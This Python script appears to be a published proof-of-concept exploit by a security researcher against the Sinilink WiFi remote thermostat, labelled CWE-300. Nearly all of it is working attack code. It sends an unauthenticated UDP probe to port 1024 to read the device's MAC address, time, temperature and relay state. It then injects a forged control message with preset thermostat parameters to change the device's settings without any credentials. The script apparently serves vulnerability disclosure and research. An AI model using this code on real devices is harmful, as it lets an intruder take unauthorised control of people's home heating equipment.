#!/usr/local/bin/python3
# Author: Victor Hanna (SpiderLabs)
# Sinilink WiFi Remote Thermostat
# CWE-300: Channel Accessible by Non-Endpoint

import requests
import re
import urllib.parse
from colorama import init
from colorama import Fore, Back, Style
import sys
import os
import time
import socket
import time
from datetime import datetime

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Banner Function
def banner():
    print ("[+]********************************************************************************[+]")
    print ("|   Author : Victor Hanna (9lyph)["+Fore.RED + "SpiderLabs" +Style.RESET_ALL+"]\t\t\t\t\t    |")
    print ("|   Description: Sinilink WiFi Remote Thermostat                                    |")
    print ("|   Usage : "+sys.argv[0]+" <host>                                                     |")
    print ("[+]********************************************************************************[+]")

def retrieve_device_info():

    SinilinkMsgFromClient = "SINILINK521"
    host = str(sys.argv[1])
    try:
        bytesToSend = str.encode(SinilinkMsgFromClient)
        serverAddressPort = (""+host, 1024)
        bufferSize = 1024
        print (Fore.GREEN + "[+] Retrieving Device Information ..." + Style.RESET_ALL)
        UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        UDPClientSocket.sendto(bytesToSend, serverAddressPort)
        time.sleep(5)
        msgFromServer = UDPClientSocket.recvfrom(bufferSize)
        msg = "Message from Server {}".format(msgFromServer[0])
        msgSplit = msg.split(",")
        MAC = msgSplit[0][30:-1]
        dt = msgSplit[1][7:]
        converted = datetime.fromtimestamp(int(dt)).strftime("%A, %B %d, %Y %I:%M:%S")
        temp = msgSplit[5]
        degree = msgSplit[6][1:-1]
        relay_value = msgSplit[2][9:]
        print (Fore.CYAN + f"    --> MAC Address: {MAC}" + Style.RESET_ALL)
        print (Fore.CYAN + f"    --> Time Stamp: {converted}" + Style.RESET_ALL)
        print (Fore.CYAN + f"    --> Current Temperature Reading: {temp}{degree}" + Style.RESET_ALL)
        if (relay_value == "1"):
            print (Fore.CYAN + f"    --> Relay State: Open" + Style.RESET_ALL)
        else:
            print (Fore.CYAN + f"    --> Relay State: Closed" + Style.RESET_ALL)
    except:
        print ("Unsuccessful")

def send_payload():
    try:
        epoch_time = str(int(time.time()))
        msgFromClient = 'PROWT4C:EB:D6:01:A8:7C{"MAC":"4C:EB:D6:01:A8:7C","time":'+epoch_time+',"param":[1,"M",0,20.8,"C","H",66,5,0,0,0,20.5,0,-40,0,0,5,1,0,0,0,0]}'
        bytesToSend = str.encode(msgFromClient)
        serverAddressPort = (""+host, 1024)
        bufferSize = 1024
        print (Fore.GREEN + "[+] Sending Payload ..." + Style.RESET_ALL)
        time.sleep(5)
        UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        UDPClientSocket.sendto(bytesToSend, serverAddressPort)
        time.sleep(15)
        UDPClientSocket.close()
    except:
        print ("Unsuccesful")
    
# Main Function
def main():
    os.system('clear')
    banner()
    retrieve_device_info()
    send_payload()
    retrieve_device_info()



if __name__ == "__main__":
    if len(sys.argv)>1:
        host = sys.argv[1]
        main()
    else:
        print (Fore.RED + f"[+] Not enough arguments, please specify target and relay!" + Style.RESET_ALL)

